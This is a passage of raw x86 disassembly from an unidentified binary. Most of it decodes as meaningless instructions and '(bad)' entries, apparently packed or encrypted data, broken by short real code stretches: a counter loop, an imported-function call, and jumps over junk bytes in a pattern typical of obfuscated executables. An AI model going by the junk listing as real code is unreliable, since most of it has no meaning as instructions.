  40ad74:	cmp    ah,BYTE PTR [eax+0x16c01c35]
  40ad7a:	retf   
  40ad7b:	xor    eax,0x96845045
  40ad80:	(bad)
  40ad84:	xor    eax,0x25fa13d1
  40ad89:	xchg   BYTE PTR [esi-0x68],bh
  40ad8c:	test   BYTE PTR [ecx],bl
  40ad8e:	sbb    dh,dh
  40ad90:	retfw  0xdd61
  40ad94:	or     DWORD PTR [esi-0x35f2c9c5],esi
  40ad9a:	cmp    al,0x7d
  40ad9c:	xchg   ebp,eax
  40ad9d:	cli    
  40ad9e:	mov    edi,0x6f942083
  40ada3:	push   0x62a55a8
  40ada8:	pushf  
  40ada9:	enter  0x205a,0xf3
  40adad:	int3   
  40adae:	and    dh,BYTE PTR [edx]
  40adb0:	popf   
  40adb1:	adc    BYTE PTR [edx+0x5d65c32d],ch
  40adb7:	ja     0x40ae24
  40adb9:	sub    al,0x8c
  40adbb:	add    esi,DWORD PTR [edi-0x4038564f]
  40adc1:	mul    BYTE PTR [esi-0x15a46df6]
  40adc7:	imul   esi,DWORD PTR [eax+0x61257574],0xffffffe6
  40adce:	push   eax
  40adcf:	jp     0x40ae3f
  40add1:	jns    0x40ae34
  40add3:	jecxz  0x40ad9b
  40add5:	sahf   
  40add6:	or     DWORD PTR [esi],edx
  40add8:	xchg   esi,eax
  40add9:	dec    ecx
  40adda:	test   al,0x48
  40addc:	push   ebx
  40addd:	mov    edx,0xb2bbefc5
  40ade2:	in     al,dx
  40ade3:	ins    BYTE PTR es:[edi],dx
  40ade4:	mov    edx,0xb39f6680
  40ade9:	xchg   edx,eax
  40adea:	fcom   QWORD PTR [ebx]
  40adec:	sbb    BYTE PTR [esi],0x40
  40adef:	into   
  40adf0:	mov    edi,0x3925ebc6
  40adf5:	mov    sp,0xd3de
  40adf9:	ret    0x5d33
  40adfc:	cmp    al,0x65
  40adfe:	push   esi
  40adff:	xor    ch,BYTE PTR [esi+0x4f]
  40ae02:	stos   BYTE PTR es:[edi],al
  40ae03:	jne    0x40ad99
  40ae05:	pop    ebx
  40ae06:	adc    BYTE PTR [edi-0x32e36881],0xc2
  40ae0d:	mov    cl,0xda
  40ae0f:	dec    ecx
  40ae10:	mov    bl,0x9a
  40ae12:	mov    dl,0xff
  40ae14:	push   0xffffffd3
  40ae16:	push   0x6371cdf3
  40ae1b:	sub    esp,edx
  40ae1d:	sbb    BYTE PTR [edx],bh
  40ae1f:	jnp    0x40adfc
  40ae21:	(bad)  
  40ae22:	retf   0x19bb
  40ae25:	hlt    
  40ae26:	cld    
  40ae27:	and    ebx,edx
  40ae29:	pcmpeqw mm3,QWORD PTR [edx+0x1a]
  40ae2d:	add    DWORD PTR ds:0xf060213d,0x28
  40ae34:	mov    eax,0xc69d25f6
  40ae39:	fucomp st(3)
  40ae3b:	imul   ecx,DWORD PTR [edi+0x53aca2fd],0x82158049
  40ae45:	pop    ebx
  40ae46:	dec    esp
  40ae47:	mov    al,ds:0xef1cd1d
  40ae4c:	push   eax
  40ae4d:	or     bl,BYTE PTR [edx]
  40ae4f:	jns    0x40ae75
  40ae51:	in     al,0xa5
  40ae53:	adc    al,0x93
  40ae55:	fcom   DWORD PTR [esi+ecx*1]
  40ae58:	sub    BYTE PTR [edx-0x3e404622],cl
  40ae5e:	jae    0x40ae94
  40ae60:	sti    
  40ae61:	icebp  
  40ae62:	jae    0x40ae77
  40ae64:	xchg   bh,ch
  40ae66:	scas   al,BYTE PTR es:[edi]
  40ae67:	imul   DWORD PTR [esi]
  40ae69:	retf   
  40ae6a:	in     eax,0xd5
  40ae6c:	inc    ecx
  40ae6d:	mov    bl,0x48
  40ae6f:	cmp    dh,0x81
  40ae72:	ror    DWORD PTR [eiz*1-0x6996a461],cl
  40ae79:	test   DWORD PTR [ebp-0x4b],esi
  40ae7c:	mov    es,edi
  40ae7e:	and    ebx,DWORD PTR [ebx]
  40ae80:	test   cl,cl
  40ae82:	repnz hlt 
  40ae84:	js     0x40ae0a
  40ae86:	xchg   esi,eax
  40ae87:	xor    DWORD PTR [esi],esi
  40ae89:	mov    dl,0x5e
  40ae8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae8c:	push   edx
  40ae8d:	lahf   
  40ae8e:	aad    0xd1
  40ae90:	sub    BYTE PTR [ecx-0x6e101b29],bh
  40ae96:	xor    BYTE PTR [edi+0x4e],0xc6
  40ae9a:	sti    
  40ae9b:	push   ss
  40ae9c:	(bad)  
  40ae9d:	outs   dx,BYTE PTR ds:[esi]
  40ae9e:	je     0x40ae84
  40aea0:	jmp    FWORD PTR [edi]
  40aea2:	outs   dx,DWORD PTR ds:[esi]
  40aea3:	push   0xffffffa0
  40aea5:	(bad)  
  40aea6:	jge    0x40ae90
  40aea8:	sahf   
  40aea9:	adc    edx,ebx
  40aeab:	icebp  
  40aeac:	pop    es
  40aead:	cmp    bl,BYTE PTR [edx+0x2cffc387]
  40aeb3:	mul    DWORD PTR [eax+0x75b72f98]
  40aeb9:	das    
  40aeba:	adc    BYTE PTR [ecx+0x55],dl
  40aebd:	mov    ebx,0x9cf12c6d
  40aec2:	rcl    DWORD PTR [esi],0x57
  40aec5:	cdq    
  40aec6:	gs iret 
  40aec8:	cmp    DWORD PTR [eax-0x3f],0x356caecc
  40aecf:	sub    esp,DWORD PTR [edi-0x4931c2f0]
  40aed5:	sub    esi,DWORD PTR [ebx]
  40aed7:	mov    dl,0x6f
  40aed9:	cli    
  40aeda:	push   edi
  40aedb:	cs pusha 
  40aedd:	mov    ds:0x6f3c41d3,al
  40aee2:	jmp    0x40af4f
  40aee4:	jg     0x40ae72
  40aee6:	sbb    eax,0x987739c9
  40aeeb:	pop    esi
  40aeec:	push   edx
  40aeed:	aas    
  40aeee:	sbb    BYTE PTR [ebx],bh
  40aef0:	nop
  40aef1:	or     bl,dl
  40aef3:	retf   
  40aef4:	jo     0x40aeb7
  40aef6:	mov    WORD PTR [eax+0x14],gs
  40aef9:	xor    DWORD PTR [edx+ebp*1+0x57da6e56],ebx
  40af00:	sub    eax,0x7ca2a9cf
  40af05:	mov    DWORD PTR ds:0xaba90d15,edx
  40af0b:	add    al,BYTE PTR [edx+eiz*4+0x47]
  40af0f:	(bad)  
  40af10:	loopne 0x40af06
  40af12:	fisub  WORD PTR ds:0xd3944de9
  40af18:	(bad)  
  40af19:	push   DWORD PTR [ebx-0x458c613e]
  40af1f:	repnz test BYTE PTR [ebp-0x3],bh
  40af23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af24:	aam    0x5a
  40af26:	fsub   DWORD PTR [esi+0x5c86048b]
  40af2c:	sub    BYTE PTR [edx+eiz*1-0x1e],al
  40af30:	arpl   di,bx
  40af32:	pop    edx
  40af33:	sbb    dh,BYTE PTR [ecx]
  40af35:	sub    eax,DWORD PTR ds:0xb9b9b642
  40af3c:	sbb    eax,0xb316c6f4
  40af41:	lds    ebx,FWORD PTR [ecx+0x5c]
  40af44:	and    edx,DWORD PTR [ecx]
  40af46:	sahf   
  40af47:	mov    gs,ebp
  40af49:	cs jo  0x40af31
  40af4c:	ret    0xd34f
  40af4f:	pop    esp
  40af50:	pusha  
  40af51:	add    BYTE PTR [ebp+0x27d03151],bh
  40af57:	jecxz  0x40afb4
  40af59:	mov    DWORD PTR [eax+ebx*2+0x4d43fd0c],esi
  40af60:	pop    ebp
  40af61:	pop    esi
  40af62:	fld    QWORD PTR [edi+0x62]
  40af65:	pop    edx
  40af66:	push   ebx
  40af67:	daa    
  40af68:	adc    eax,0xf675ed39
  40af6d:	inc    ebx
  40af6e:	jbe    0x40af2a
  40af70:	cmp    DWORD PTR [ebx-0x367ee7c0],ecx
  40af76:	sbb    BYTE PTR [eax+0x0],dh
  40af79:	add    BYTE PTR [ecx+0x458be045],cl
  40af7f:	in     al,dx
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4337a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43375f
  40af93:	sub    DWORD PTR ds:0x43370f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43375b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43375b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43375b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43375b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43375b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43375b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43375b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43375b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4337a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	cli    
  40b018:	stos   DWORD PTR es:[edi],eax
  40b019:	add    ah,cl
  40b01b:	idiv   DWORD PTR fs:[esi+0x7e]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	jno    0x40b056
  40b025:	out    0xf0,eax
  40b027:	aad    0x66
  40b029:	(bad)  
  40b02b:	and    al,0xa8
  40b02d:	mov    ah,0x3b
  40b02f:	push   ecx
  40b030:	and    eax,0x9eecaf86
  40b035:	fistp  QWORD PTR ss:[edi]
  40b038:	dec    edx
  40b039:	(bad)  
  40b03a:	xor    DWORD PTR [ebx],esp
  40b03c:	add    ch,bl
  40b03e:	gs and eax,0x3b041f0f
  40b044:	mov    eax,DWORD PTR [edi-0x320317a1]
  40b04a:	cmp    DWORD PTR [eax-0x70],edx
  40b04d:	dec    ecx
  40b04e:	(bad)  
  40b04f:	loop   0x40b031
  40b051:	inc    ebx
  40b052:	fs xor dh,al
  40b055:	test   DWORD PTR [edx+0x429424a8],edx
  40b05b:	clc    
  40b05c:	stc    
  40b05d:	push   esi
  40b05e:	xchg   ebp,eax
  40b05f:	dec    ecx
  40b060:	(bad)  
  40b062:	cli    
  40b063:	ret    
  40b064:	xchg   ecx,eax
  40b065:	js     0x40b0d6
  40b067:	xor    BYTE PTR [ebx+0x73],cl
  40b06a:	mov    al,ds:0x7e601227
  40b06f:	jne    0x40b040
  40b071:	test   al,0xd0
  40b073:	hlt    
  40b074:	dec    eax
  40b075:	stos   DWORD PTR es:[edi],eax
  40b076:	lock shl cl,0x1f
  40b07a:	inc    esi
  40b07b:	add    DWORD PTR [ecx],esp
  40b07d:	inc    ebp
  40b07e:	retf   
  40b07f:	ret    
  40b080:	jae    0x40b032
  40b082:	sub    bl,ah
  40b084:	and    bl,BYTE PTR [ebx+0x15ce7943]
  40b08a:	rcr    DWORD PTR [eax+0x2d],0xd6
  40b08e:	out    0x2,al
  40b090:	mov    cs,eax
  40b092:	jno    0x40b0e0
  40b094:	xor    dl,BYTE PTR [ebx+edx*1]
  40b097:	pop    ecx
  40b098:	push   edi
  40b099:	test   al,0x95
  40b09b:	xchg   edx,eax
  40b09c:	sbb    eax,edi
  40b09e:	mov    ch,0x9c
  40b0a0:	inc    ebp
  40b0a1:	dec    esp
  40b0a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0a3:	fistp  DWORD PTR [edx-0x7e]
  40b0a6:	mov    al,BYTE PTR [esi-0x1b59c686]
  40b0ac:	and    eax,0xa9f8b8af
  40b0b1:	add    BYTE PTR [esi-0x6fd8493],al
  40b0b7:	jl     0x40b03e
  40b0b9:	xor    eax,0x5f3c03f9
  40b0be:	ret    
  40b0bf:	push   ss
  40b0c0:	jbe    0x40b0ba
  40b0c2:	pop    es
  40b0c3:	and    BYTE PTR [ecx+0x11],dl
  40b0c6:	adc    al,0x4f
  40b0c8:	mov    ebx,0xedc1de7d
  40b0cd:	dec    ecx
  40b0ce:	ficom  WORD PTR [ebp+0x10151a9f]
  40b0d4:	cmc    
  40b0d5:	(bad)  
  40b0d6:	and    edx,DWORD PTR [ebx-0x3119ac28]
  40b0dc:	and    bh,BYTE PTR [esi+0x6f91c3dc]
  40b0e2:	out    dx,eax
  40b0e3:	sbb    DWORD PTR [esi],ebx
  40b0e5:	mov    edi,0x1d2ca037
  40b0ea:	mov    al,0x8b
  40b0ec:	clc    
  40b0ed:	retf   0x6cad
  40b0f0:	cli    
  40b0f1:	pop    edi
  40b0f2:	idiv   ebp
  40b0f4:	dec    ecx
  40b0f5:	mov    eax,0x84388a2f
  40b0fa:	clc    
  40b0fb:	xchg   ecx,eax
  40b0fc:	(bad)  [edx]
  40b0fe:	les    edx,FWORD PTR [esp+ebx*8]
  40b101:	xor    esi,edx
  40b103:	call   0x7e8e993
  40b108:	and    eax,0x303162b2
  40b10d:	jmp    0xecbddda5
  40b112:	in     eax,0x1d
  40b114:	push   ecx
  40b115:	or     edi,DWORD PTR [edx-0xb]
  40b118:	into   
  40b119:	mov    bl,0xbd
  40b11b:	mov    ebp,0x2addf3ab
  40b120:	sbb    BYTE PTR [ecx+0xa],bl
  40b123:	mov    DWORD PTR [edx+0x6a],edx
  40b126:	sub    DWORD PTR [edx+0x3f],edi
  40b129:	inc    esp
  40b12a:	fs enter 0xc22a,0xae
  40b12f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b130:	(bad)  [edx-0x73]
  40b133:	sbb    edi,DWORD PTR [esi+edi*4]
  40b136:	jle    0x40b0e2
  40b138:	pop    esi
  40b139:	rcl    DWORD PTR [ebx],0xb0
  40b13c:	push   es
  40b13d:	jno    0x40b0f8
  40b13f:	pop    ebp
  40b140:	test   eax,0x843f62e5
  40b145:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b146:	jnp    0x40b179
  40b148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b149:	lds    esi,FWORD PTR [edx+ecx*8+0x23]
  40b14d:	idiv   BYTE PTR [edi-0x27]
  40b150:	pushf  
  40b151:	inc    ebp
  40b152:	pop    eax
  40b153:	adc    DWORD PTR [eax-0x3],ebp
  40b156:	push   es
  40b157:	inc    edx
  40b158:	cmp    ecx,DWORD PTR [ebp+esi*1+0x32703c0e]
  40b15f:	(bad)
  40b162:	in     al,dx
  40b163:	pop    es
  40b164:	adc    DWORD PTR [edx],esi
  40b166:	mov    eax,0x5628b3cb
  40b16b:	cmp    al,BYTE PTR [ecx-0x7844d0ae]
  40b171:	push   edi
  40b172:	(bad)  
  40b173:	popf   
  40b174:	xlat   BYTE PTR ds:[ebx]
  40b175:	push   dx
  40b177:	jae    0x40b1ac
  40b179:	pop    ds
  40b17a:	and    eax,0x511a6235
  40b17f:	(bad)  
  40b180:	pop    esp
  40b181:	cdq    
  40b182:	jbe    0x40b1bc
  40b184:	out    0x4b,al
  40b186:	leave  
  40b187:	push   edx
  40b188:	mov    ds:0xcba4671a,al
  40b18d:	int3   
  40b18e:	push   ss
  40b18f:	adc    ch,BYTE PTR [ebp+0xe]
  40b192:	call   0x5d5be172
  40b197:	or     BYTE PTR [esi+0x73b3def1],dh
  40b19d:	push   ds
  40b19e:	and    BYTE PTR [eax+0x7b2055f5],bl
  40b1a4:	or     ebx,DWORD PTR ds:0x7542370e
  40b1aa:	enter  0x4c1a,0x83
  40b1ae:	mov    bl,0xcc
  40b1b0:	mul    BYTE PTR [edi+0xf]
  40b1b3:	jns    0x40b1ec
  40b1b5:	xchg   ebp,eax
  40b1b6:	mov    ds:0xf1278575,al
  40b1bb:	mov    ebp,DWORD PTR [edi]
  40b1bd:	mov    ah,0x1c
  40b1bf:	fcmove st,st(5)
  40b1c1:	shl    BYTE PTR [eax+0x9],0xaf
  40b1c5:	fld    DWORD PTR [ebx-0x6b]
  40b1c8:	test   eax,0x34d478c3
  40b1cd:	fstp   QWORD PTR [edi-0x65eb2749]
  40b1d3:	jns    0x40b1ef
  40b1d5:	xchg   DWORD PTR [edi+0x64],ebp
  40b1d8:	xor    DWORD PTR [edx],edi
  40b1da:	pop    es
  40b1db:	fwait
  40b1dc:	icebp  
  40b1dd:	xor    cl,bh
  40b1df:	(bad)  
  40b1e0:	shl    BYTE PTR [edx+ecx*4+0x39],cl
  40b1e4:	jnp    0x40b1f7
  40b1e6:	dec    edi
  40b1e7:	ins    DWORD PTR es:[edi],dx
  40b1e8:	(bad)  
  40b1e9:	dec    eax
  40b1ea:	and    al,0x99
  40b1ec:	fld    QWORD PTR [eax]
  40b1ee:	jge    0x40b174
  40b1f0:	inc    BYTE PTR gs:0xbceb84c5
  40b1f7:	shl    DWORD PTR [edx+0x39ca17ce],0x25
  40b1fe:	sbb    DWORD PTR [edi],eax
  40b200:	pop    es
  40b201:	popa   
  40b202:	js     0x40b1e1
  40b204:	test   eax,0x2494c2c7
  40b209:	dec    ebp
  40b20a:	pop    ebx
  40b20b:	jae    0x40b249
  40b20d:	jae    0x40b249
  40b20f:	push   ds
  40b210:	js     0x40b1d4
  40b212:	shl    edi,0x5b
  40b215:	xchg   ebp,eax
  40b216:	lods   al,BYTE PTR ds:[esi]
  40b217:	sub    ecx,edx
  40b219:	int    0x6f
  40b21b:	sub    edi,DWORD PTR [ecx+0x14]
  40b21e:	jmp    0xda45:0xe49b0bed
  40b225:	sub    cl,ch
  40b227:	getsec 
  40b229:	pop    edi
  40b22a:	scas   eax,DWORD PTR es:[edi]
  40b22b:	les    ebx,FWORD PTR [eax+edi*8-0x30f3c594]
  40b232:	xchg   edx,eax
  40b233:	lds    eax,FWORD PTR [ecx-0x14]
  40b236:	ret    
  40b237:	mov    ch,0x76
  40b239:	dec    ebx
  40b23a:	ins    DWORD PTR es:[edi],dx
  40b23b:	outs   dx,BYTE PTR ds:[esi]
  40b23c:	jmp    0x40b200
  40b23e:	and    al,0x50
  40b240:	pop    es
  40b241:	int3   
  40b242:	ins    BYTE PTR es:[edi],dx
  40b243:	adc    eax,0x87ea7aff
  40b248:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b249:	push   ecx
  40b24a:	sahf   
  40b24b:	xchg   BYTE PTR [edx],bl
  40b24d:	and    ecx,DWORD PTR [esi+0x1ec8449e]
  40b253:	jmp    0x6aaa9f52
  40b258:	dec    ecx
  40b259:	sub    eax,0xb76402eb
  40b25e:	sbb    ah,BYTE PTR [edi-0x4b390987]
  40b264:	cmp    ebx,DWORD PTR [edx+eiz*2+0x458b3649]
  40b26b:	in     al,dx
  40b26c:	mov    ecx,DWORD PTR [ebp+0x8]
  40b26f:	add    ecx,DWORD PTR [eax+0x24]
  40b272:	jmp    0x40b4d5
  40b277:	jno    0x40b206
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	jno    0x40b228
  40b285:	mov    WORD PTR [edx+0x2e],ss
  40b288:	bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	xor    al,0x46
  40b291:	dec    ebp
  40b292:	ja     0x40b268
  40b294:	jne    0x40b24a
  40b296:	sub    edx,ecx
  40b298:	hlt    
  40b299:	push   ss
  40b29a:	mov    WORD PTR [ebp+0x142945],fs
  40b2a0:	loopne 0x40b289
  40b2a2:	lods   al,BYTE PTR ds:[esi]
  40b2a3:	(bad)  
  40b2a4:	lahf   
  40b2a5:	mov    dh,0xe3
  40b2a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2a8:	sbb    eax,0x21df3df5
  40b2ad:	setne  dh
  40b2b0:	dec    DWORD PTR [ecx]
  40b2b2:	fstp   QWORD PTR [edx-0x642a3819]
  40b2b8:	xor    ebx,edi
  40b2ba:	xor    ch,bl
  40b2bc:	add    cl,BYTE PTR [edi-0x32]
  40b2bf:	scas   al,BYTE PTR es:[edi]
  40b2c0:	bound  esp,QWORD PTR [edi]
  40b2c2:	sahf   
  40b2c3:	sbb    dl,cl
  40b2c5:	ins    BYTE PTR es:[edi],dx
  40b2c6:	xchg   BYTE PTR [edx],bh
  40b2c8:	pop    esi
  40b2c9:	cmp    BYTE PTR [eax-0x2b3f926d],dl
  40b2cf:	das    
  40b2d0:	outs   dx,DWORD PTR ds:[esi]
  40b2d1:	lods   al,BYTE PTR ds:[esi]
  40b2d2:	fild   WORD PTR ds:0xe32436e9
  40b2d8:	ds mov esp,0x5b61ce63
  40b2de:	mov    eax,ds:0x13ac8dfe
  40b2e3:	ja     0x40b30e
  40b2e5:	leave  
  40b2e6:	dec    eax
  40b2e7:	sub    DWORD PTR [edi+0x512f4e07],edi
  40b2ed:	inc    edi
  40b2ee:	cmp    eax,0x1927bd68
  40b2f3:	rol    DWORD PTR [ebx-0x7c4096b3],1
  40b2f9:	add    eax,DWORD PTR [ebp-0x12]
  40b2fc:	jne    0x40b2b4
  40b2fe:	jbe    0x40b32a
  40b300:	(bad)  
  40b301:	(bad)  
  40b302:	xor    DWORD PTR [eax-0x54],ebx
  40b305:	mov    ds:0x1709b18a,eax
  40b30a:	adc    ebp,DWORD PTR [ecx-0x428a8da1]
  40b310:	out    0x8a,al
  40b312:	pop    ss
  40b313:	fld    TBYTE PTR [eax]
  40b315:	imul   ebx,DWORD PTR [ecx-0x3c9e7114],0xd40aaee
  40b31f:	sub    dh,BYTE PTR [ecx-0x7d1625a1]
  40b325:	push   ss
  40b326:	test   eax,0x5c02b2b7
  40b32b:	mov    ds:0xd43e4fd8,eax
  40b330:	retf   0xdf39
  40b333:	daa    
  40b334:	nop
  40b335:	and    al,0xa1
  40b337:	xor    al,0x92
  40b339:	mov    al,ds:0x48716f3
  40b33e:	cmp    DWORD PTR [ebx+0x6ea4df83],0x29
  40b345:	add    bh,0xb3
  40b348:	nop
  40b349:	jae    0x40b367
  40b34b:	xchg   ebx,eax
  40b34c:	sbb    dh,dh
  40b34e:	jbe    0x40b319
  40b350:	add    BYTE PTR [esi],al
  40b352:	sub    eax,0x8f74f038
  40b357:	xchg   ecx,eax
  40b358:	stos   BYTE PTR es:[edi],al
  40b359:	cmp    esp,DWORD PTR [esi+0x5d]
  40b35c:	push   ebx
  40b35d:	retf   0xe1b2
  40b360:	sahf   
  40b361:	in     eax,dx
  40b362:	clc    
  40b363:	cld    
  40b364:	sub    ecx,DWORD PTR [eax]
  40b366:	in     al,dx
  40b367:	arpl   WORD PTR [eax+ebp*8-0x33],ax
  40b36b:	stos   BYTE PTR es:[edi],al
  40b36c:	mov    dh,0x14
  40b36e:	nop
  40b36f:	inc    ebp
  40b370:	addr16 retf 0xd6ab
  40b374:	jmp    0x40b3cd
  40b376:	xchg   DWORD PTR [ecx],esp
  40b378:	xchg   edi,eax
  40b379:	inc    ecx
  40b37a:	cs jmp 0x40b38d
  40b37d:	fst    DWORD PTR [ebx]
  40b37f:	imul   ebx,DWORD PTR [ebx+0x5f],0x69
  40b383:	push   ebp
  40b384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b385:	test   eax,0x22aac981
  40b38a:	push   edx
  40b38b:	ret    0x4e83
  40b38e:	sahf   
  40b38f:	pushf  
  40b390:	cld    
  40b391:	stos   DWORD PTR es:[edi],eax
  40b392:	rcl    DWORD PTR [ebx-0x3d],1
  40b395:	idiv   BYTE PTR [ebx+eiz*1-0x3f]
  40b399:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b39a:	stos   BYTE PTR es:[edi],al
  40b39b:	pushf  
  40b39c:	mov    al,ds:0x26275df2
  40b3a1:	lods   eax,DWORD PTR ds:[esi]
  40b3a2:	fild   WORD PTR [edx]
  40b3a4:	sbb    al,0x33
  40b3a6:	leave  
  40b3a7:	xor    esi,edi
  40b3a9:	and    bl,ah
  40b3ab:	aam    0x80
  40b3ad:	push   es
  40b3ae:	push   0xc96c20c0
  40b3b3:	loope  0x40b3f9
  40b3b5:	and    esp,edx
  40b3b7:	jecxz  0x40b356
  40b3b9:	dec    edi
  40b3ba:	call   0xfe38af4e
  40b3bf:	je     0x40b36c
  40b3c1:	mov    ebx,0x836d6fec
  40b3c6:	add    edi,DWORD PTR [edi-0x6f7ef593]
  40b3cc:	lods   eax,DWORD PTR ds:[esi]
  40b3cd:	stos   BYTE PTR es:[edi],al
  40b3ce:	cmp    ah,bl
  40b3d0:	adc    DWORD PTR [ebx],ecx
  40b3d2:	cli    
  40b3d3:	jnp    0x40b3ea
  40b3d5:	(bad)  
  40b3d6:	mov    edx,DWORD PTR [ebx]
  40b3d8:	mov    dh,0xf5
  40b3da:	push   es
  40b3db:	in     al,0x89
  40b3dd:	ja     0x40b421
  40b3df:	jmp    0x40b3d6
  40b3e1:	addr16 jp 0x40b3c8
  40b3e4:	les    esi,FWORD PTR [ecx-0x302288a6]
  40b3ea:	stos   DWORD PTR es:[edi],eax
  40b3eb:	(bad)  
  40b3ec:	push   esp
  40b3ed:	xor    edi,DWORD PTR [edi-0x311ad3c1]
  40b3f3:	mov    ebx,0xe34b4ea6
  40b3f8:	mov    edx,0xf722e1c7
  40b3fd:	adc    eax,0x8aa38548
  40b402:	hlt    
  40b403:	sbb    esp,0x2e
  40b406:	call   0xf5a9d3ea
  40b40b:	pop    esp
  40b40c:	fistp  DWORD PTR [ebx-0x13]
  40b40f:	mov    edx,0x631c59a3
  40b414:	mov    ds:0xb1f8416f,eax
  40b419:	xor    DWORD PTR [ecx+0x47b343b3],ecx
  40b41f:	sahf   
  40b420:	adc    bh,bh
  40b422:	xchg   ecx,eax
  40b423:	mov    dl,BYTE PTR [esi]
  40b425:	cli    
  40b426:	dec    ebx
  40b427:	(bad)  
  40b428:	mov    ch,dh
  40b42a:	aam    0xa8
  40b42c:	add    dh,BYTE PTR [esi+edi*2-0xf02de13]
  40b433:	jmp    0x40b47a
  40b435:	lods   eax,DWORD PTR ds:[esi]
  40b436:	test   al,0xd3
  40b438:	retf   
  40b439:	imul   ebp,DWORD PTR [ebx-0xa],0x633a7141
  40b440:	aad    0x1b
  40b442:	addr16 loop 0x40b44a
  40b445:	mov    esp,0x757b2669
  40b44a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b44b:	xor    esp,DWORD PTR [eax-0x40f6490d]
  40b451:	push   edx
  40b452:	and    BYTE PTR [ebx+0x14],cl
  40b455:	dec    edi
  40b456:	gs js  0x40b41d
  40b459:	xor    al,0x7
  40b45b:	lock jb 0x40b4b8
  40b45e:	rcr    edi,cl
  40b460:	arpl   WORD PTR [esi-0x69],sp
  40b463:	cmp    al,0xd4
  40b465:	add    DWORD PTR [ebx+0x3d],edi
  40b468:	test   eax,0xe8c7bb11
  40b46d:	daa    
  40b46e:	std    
  40b46f:	push   cs
  40b470:	js     0x40b424
  40b472:	ins    BYTE PTR es:[edi],dx
  40b473:	call   0x6419:0xd98f1a56
  40b47a:	mov    esi,0x3c5287dd
  40b47f:	dec    ecx
  40b480:	mov    fs,WORD PTR [edi+0x7c94998]
  40b486:	aas    
  40b487:	mov    DWORD PTR [edx],ebp
  40b489:	retf   0x51eb
  40b48c:	dec    ecx
  40b48d:	cmp    edx,ebp
  40b48f:	sub    BYTE PTR [ebx],bh
  40b491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b492:	call   0xde98:0xdf47fe30
  40b499:	iret   
  40b49a:	lea    edi,[edx+0x51eb39a4]
  40b4a0:	addr16 mov ds:0x47a6,al
  40b4a4:	sub    ebp,eax
  40b4a6:	es inc esi
  40b4a8:	sbb    al,0x53
  40b4aa:	mov    ebx,0xfad150bd
  40b4af:	mov    bh,0x43
  40b4b1:	test   eax,0xe43caabf
  40b4b6:	add    BYTE PTR [esi],0xe9
  40b4b9:	push   edx
  40b4ba:	iret   
  40b4bb:	sbb    dh,BYTE PTR [edi+0x2e]
  40b4be:	sub    BYTE PTR ds:0x216b2bc,bh
  40b4c4:	adc    eax,0x7a4559a5
  40b4c9:	iret   
  40b4ca:	stos   DWORD PTR es:[edi],eax
  40b4cb:	int3   
  40b4cc:	dec    ebp
  40b4cd:	aaa    
  40b4ce:	ret    
  40b4cf:	inc    ebx
  40b4d0:	arpl   WORD PTR [ebp-0x76249321],ax
  40b4d6:	dec    ebp
  40b4d7:	aam    0x8b
  40b4d9:	inc    ebp
  40b4da:	in     al,dx
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	cmc    
  40b508:	mov    esp,0xf0e87e72
  40b50d:	jle    0x40b58d
  40b50f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b513:	dec    eax
  40b514:	into   
  40b515:	shl    DWORD PTR [eax+0x7b],cl
  40b518:	popa   
  40b519:	push   ss
  40b51a:	fstp   TBYTE PTR [esi]
  40b51c:	sub    cl,dh
  40b51e:	pop    ecx
  40b51f:	sbb    DWORD PTR ds:0x3d030e79,edi
